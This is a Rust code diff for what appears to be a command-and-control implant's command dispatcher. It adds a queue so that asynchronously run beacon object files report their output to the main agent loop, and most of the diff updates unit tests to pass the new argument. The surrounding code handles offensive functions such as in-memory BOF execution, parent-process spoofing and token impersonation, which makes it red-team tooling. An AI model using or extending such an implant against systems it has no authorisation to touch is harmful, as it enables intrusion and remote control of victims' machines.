@@ -29,6 +29,7 @@ use red_cell_common::demon::{
 use tracing::{info, warn};
 
 use crate::coffeeldr;
+use crate::coffeeldr::BofOutputQueue;
 use crate::config::SpecterConfig;
 use crate::dotnet;
 use crate::download::{
@@ -136,6 +137,7 @@ pub fn dispatch(
     mem_files: &mut MemFileStore,
     job_store: &mut JobStore,
     ps_scripts: &mut PsScriptStore,
+    bof_output_queue: &BofOutputQueue,
 ) -> DispatchResult {
     let cmd = match DemonCommand::try_from(package.command_id) {
         Ok(c) => c,
@@ -168,7 +170,7 @@ pub fn dispatch(
         DemonCommand::CommandKerberos => handle_kerberos(&package.payload),
         DemonCommand::CommandConfig => handle_config(&package.payload, config),
         DemonCommand::CommandInlineExecute => {
-            handle_inline_execute(&package.payload, config, mem_files, job_store)
+            handle_inline_execute(&package.payload, config, mem_files, job_store, bof_output_queue)
         }
         DemonCommand::CommandJob => handle_job(&package.payload, job_store),
         DemonCommand::CommandPsImport => handle_ps_import(&package.payload, ps_scripts, mem_files),
@@ -3577,10 +3579,12 @@ fn handle_inline_execute(
     config: &SpecterConfig,
     mem_files: &mut MemFileStore,
     job_store: &mut JobStore,
+    bof_output_queue: &BofOutputQueue,
 ) -> DispatchResult {
-    // job_store is only consumed on Windows inside the #[cfg(windows)] block.
+    // job_store and bof_output_queue are only consumed on Windows inside the
+    // #[cfg(windows)] block.
     #[cfg(not(windows))]
-    let _ = &*job_store;
+    let _ = (job_store, bof_output_queue);
 
     let mut offset = 0;
 
@@ -3673,13 +3677,15 @@ fn handle_inline_execute(
             function_name.clone(),
             bof_data.clone(),
             arg_data.clone(),
+            bof_output_queue.clone(),
         ) {
             Some(handle) => {
                 let job_id = job_store.add(JOB_TYPE_THREAD, handle);
                 info!(job_id, function = %function_name, "BOF thread started and registered");
                 mem_files.remove(&bof_file_id);
                 mem_files.remove(&params_file_id);
-                // No immediate response — output arrives asynchronously from the thread.
+                // No immediate response — callbacks will be queued in
+                // bof_output_queue and drained by the main agent loop.
                 return DispatchResult::Ignore;
             }
             None => {
@@ -4379,6 +4385,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
 
         assert_eq!(config.sleep_delay_ms, 3000);
@@ -4408,6 +4415,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert_eq!(config.sleep_jitter, 100);
     }
@@ -4424,6 +4432,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Ignore));
     }
@@ -4443,6 +4452,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
 
         let DispatchResult::Respond(resp) = result else {
@@ -4478,6 +4488,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
 
         let DispatchResult::Respond(resp) = result else {
@@ -4506,6 +4517,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Ignore));
     }
@@ -4529,6 +4541,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Respond(_)));
     }
@@ -4554,6 +4567,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -4615,6 +4629,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -4696,6 +4711,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
 
         let DispatchResult::MultiRespond(resps) = result else {
@@ -4736,6 +4752,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
 
         let DispatchResult::MultiRespond(resps) = result else {
@@ -4793,6 +4810,7 @@ mod tests {
                 &mut HashMap::new(),
                 &mut JobStore::new(),
                 &mut Vec::new(),
+                &crate::coffeeldr::new_bof_output_queue(),
             ),
             DispatchResult::Ignore
         ));
@@ -4811,6 +4829,7 @@ mod tests {
                 &mut HashMap::new(),
                 &mut JobStore::new(),
                 &mut Vec::new(),
+                &crate::coffeeldr::new_bof_output_queue(),
             ),
             DispatchResult::Ignore
         ));
@@ -4829,6 +4848,7 @@ mod tests {
                 &mut HashMap::new(),
                 &mut JobStore::new(),
                 &mut Vec::new(),
+                &crate::coffeeldr::new_bof_output_queue(),
             ),
             DispatchResult::Exit
         ));
@@ -4868,6 +4888,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond, got {result:?}");
@@ -4889,6 +4910,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -4909,6 +4931,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -4930,6 +4953,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -4981,6 +5005,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5004,6 +5029,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5027,6 +5053,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5049,6 +5076,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5070,6 +5098,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Ignore));
     }
@@ -5098,6 +5127,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5121,6 +5151,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5146,6 +5177,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5171,6 +5203,7 @@ mod tests {
                 &mut HashMap::new(),
                 &mut JobStore::new(),
                 &mut Vec::new(),
+                &crate::coffeeldr::new_bof_output_queue(),
             ),
             DispatchResult::Ignore
         ));
@@ -5192,6 +5225,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5217,6 +5251,7 @@ mod tests {
                 &mut HashMap::new(),
                 &mut JobStore::new(),
                 &mut Vec::new(),
+                &crate::coffeeldr::new_bof_output_queue(),
             ),
             DispatchResult::Ignore
         ));
@@ -5237,6 +5272,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5281,6 +5317,7 @@ mod tests {
                 &mut HashMap::new(),
                 &mut JobStore::new(),
                 &mut Vec::new(),
+                &crate::coffeeldr::new_bof_output_queue(),
             ),
             DispatchResult::Ignore
         ));
@@ -5299,6 +5336,7 @@ mod tests {
                 &mut HashMap::new(),
                 &mut JobStore::new(),
                 &mut Vec::new(),
+                &crate::coffeeldr::new_bof_output_queue(),
             ),
             DispatchResult::Ignore
         ));
@@ -5316,6 +5354,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5337,6 +5376,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5358,6 +5398,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5384,6 +5425,7 @@ mod tests {
                 &mut HashMap::new(),
                 &mut JobStore::new(),
                 &mut Vec::new(),
+                &crate::coffeeldr::new_bof_output_queue(),
             ),
             DispatchResult::Ignore
         ));
@@ -5402,6 +5444,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5422,6 +5465,7 @@ mod tests {
                 &mut HashMap::new(),
                 &mut JobStore::new(),
                 &mut Vec::new(),
+                &crate::coffeeldr::new_bof_output_queue(),
             ),
             DispatchResult::Ignore
         ));
@@ -5440,6 +5484,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5465,6 +5510,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5484,6 +5530,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5504,6 +5551,7 @@ mod tests {
                 &mut HashMap::new(),
                 &mut JobStore::new(),
                 &mut Vec::new(),
+                &crate::coffeeldr::new_bof_output_queue(),
             ),
             DispatchResult::Ignore
         ));
@@ -5522,6 +5570,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5545,6 +5594,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5573,6 +5623,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5592,6 +5643,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5612,6 +5664,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5655,6 +5708,7 @@ mod tests {
                 &mut HashMap::new(),
                 &mut JobStore::new(),
                 &mut Vec::new(),
+                &crate::coffeeldr::new_bof_output_queue(),
             ),
             DispatchResult::Ignore
         ));
@@ -5687,6 +5741,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5715,6 +5770,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5757,6 +5813,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5807,6 +5864,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5838,6 +5896,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5866,6 +5925,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5903,6 +5963,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5939,6 +6000,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5964,6 +6026,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -5995,6 +6058,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -6026,6 +6090,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Ignore));
     }
@@ -6064,6 +6129,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         ) else {
             panic!("expected Respond");
         };
@@ -6093,7 +6159,8 @@ mod tests {
                 &mut downloads,
                 &mut HashMap::new(),
                 &mut JobStore::new(),
-                &mut Vec::new()
+                &mut Vec::new(),
+                &crate::coffeeldr::new_bof_output_queue(),
             ),
             DispatchResult::Ignore
         ));
@@ -6113,7 +6180,8 @@ mod tests {
                 &mut downloads,
                 &mut HashMap::new(),
                 &mut JobStore::new(),
-                &mut Vec::new()
+                &mut Vec::new(),
+                &crate::coffeeldr::new_bof_output_queue(),
             ),
             DispatchResult::Ignore
         ));
@@ -6527,6 +6595,7 @@ mod tests {
             &mut mem_files,
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Respond(_)));
         assert!(mem_files.contains_key(&1));
@@ -6549,6 +6618,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Respond(_)));
     }
@@ -6679,6 +6749,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Respond(_)));
         assert_eq!(config.ppid_spoof, Some(5678));
@@ -6744,6 +6815,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Respond(_)));
     }
@@ -6795,6 +6867,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Respond(_)));
     }
@@ -6846,6 +6919,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Respond(_)));
     }
@@ -6913,6 +6987,7 @@ mod tests {
             &mut mem_files,
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         // On non-Windows, get_luid returns error → success=FALSE.
         let DispatchResult::Respond(resp) = result else {
@@ -7340,6 +7415,7 @@ mod tests {
             &mut mem_files,
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
 
         assert!(config.verbose);
@@ -7407,6 +7483,7 @@ mod tests {
             &mut mem_files,
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond");
@@ -7423,6 +7500,7 @@ mod tests {
             &SpecterConfig::default(),
             &mut HashMap::new(),
             &mut JobStore::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond");
@@ -7453,6 +7531,7 @@ mod tests {
             &SpecterConfig::default(),
             &mut HashMap::new(),
             &mut JobStore::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond");
@@ -7481,6 +7560,7 @@ mod tests {
             &SpecterConfig::default(),
             &mut mem_files,
             &mut JobStore::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond");
@@ -7511,6 +7591,7 @@ mod tests {
             &SpecterConfig::default(),
             &mut mem_files,
             &mut JobStore::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         // Should get some kind of response (BOF_COULD_NOT_RUN on invalid COFF)
         match result {
@@ -7746,6 +7827,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond");
@@ -7765,6 +7847,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond");
@@ -7787,6 +7870,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Ignore));
     }
@@ -7813,6 +7897,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Ignore));
 
@@ -7838,6 +7923,7 @@ mod tests {
             &mut mem_files,
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Ignore));
         assert!(mem_files.get(&55).is_none(), "mem-file should have been removed");
@@ -7856,6 +7942,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Ignore));
     }
@@ -7882,6 +7969,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
 
         let entry = downloads.get(file_id).expect("entry should exist");
@@ -7904,6 +7992,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Respond(_)));
     }
@@ -7921,6 +8010,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Respond(_)));
     }
@@ -7938,6 +8028,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Respond(_)));
     }
@@ -7955,6 +8046,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Respond(_)));
     }
@@ -7972,6 +8064,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Respond(_)));
     }
@@ -7992,6 +8085,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         // Config handler returns Ignore for most valid updates (no response ack).
         // Just verify it doesn't panic.
@@ -8010,6 +8104,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Respond(_)));
     }
@@ -8028,6 +8123,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Respond(_)));
     }
@@ -8044,6 +8140,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(
             matches!(result, DispatchResult::Ignore),
@@ -8063,6 +8160,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(
             matches!(result, DispatchResult::Ignore),
@@ -8082,6 +8180,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(
             matches!(result, DispatchResult::Ignore),
@@ -8104,6 +8203,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond, got something else — operator task would hang forever");
@@ -8152,6 +8252,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert_eq!(config.sleep_delay_ms, 0);
         assert_eq!(config.sleep_jitter, 0);
@@ -8170,6 +8271,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert_eq!(config.sleep_delay_ms, u32::MAX);
         assert_eq!(config.sleep_jitter, 100);
@@ -8196,6 +8298,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(
             matches!(result, DispatchResult::Ignore),
@@ -8227,6 +8330,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(
             matches!(result, DispatchResult::Ignore),
@@ -8263,6 +8367,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond for dir listing");
@@ -8310,6 +8415,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond for dir listing");
@@ -8355,6 +8461,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond for dir listing");
@@ -8386,6 +8493,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Ignore));
     }
@@ -8402,6 +8510,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Ignore));
     }
@@ -8428,6 +8537,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         let DispatchResult::MultiRespond(responses) = result else {
             panic!("expected MultiRespond for proc create");
@@ -8466,6 +8576,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         // Even with a non-zero exit code, the handler should return MultiRespond
         // (the process ran, it just exited non-zero).
@@ -8487,6 +8598,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Ignore));
     }
@@ -8504,6 +8616,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Ignore));
     }
@@ -8524,6 +8637,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond for proc grep");
@@ -8547,6 +8661,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         // ProcList should still respond even with empty payload (uses default process_ui = 0).
         assert!(matches!(result, DispatchResult::Respond(_)));
@@ -8566,6 +8681,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Ignore));
     }
@@ -8591,6 +8707,7 @@ mod tests {
             &mut mem_files,
             &mut JobStore::new(),
             &mut ps_scripts,
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert_eq!(ps_scripts.len(), script1.len());
 
@@ -8607,6 +8724,7 @@ mod tests {
             &mut mem_files,
             &mut JobStore::new(),
             &mut ps_scripts,
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         // After second import, the stored script should be the second one.
         assert_eq!(ps_scripts.len(), script2.len());
@@ -8640,6 +8758,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         // On non-Windows, impersonation fails because there's no real handle.
         assert!(matches!(result, DispatchResult::Respond(_)));
@@ -8666,6 +8785,7 @@ mod tests {
             &mut mem_files,
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         // Zero-size memfile should return an ack response and be stored.
         assert!(matches!(result, DispatchResult::Respond(_)));
@@ -8687,6 +8807,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         // Short payload → returns CouldNotRun response.
         assert!(matches!(result, DispatchResult::Respond(_)));
@@ -8725,6 +8846,7 @@ mod tests {
             mem_files,
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
     }
 
@@ -8749,6 +8871,7 @@ mod tests {
             &mut mem_files,
             &mut job_store,
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Respond(_)));
         assert_eq!(job_store.list().count(), 0, "no job should be registered on error");
@@ -8781,6 +8904,7 @@ mod tests {
             &mut mem_files,
             &mut job_store,
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         assert!(matches!(result, DispatchResult::Respond(_)));
         assert_eq!(job_store.list().count(), 0, "sync BOF must not register a job");
@@ -8814,11 +8938,50 @@ mod tests {
             &mut mem_files,
             &mut job_store,
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         // Non-Windows sync fallback → returns BOF_COULD_NOT_RUN response
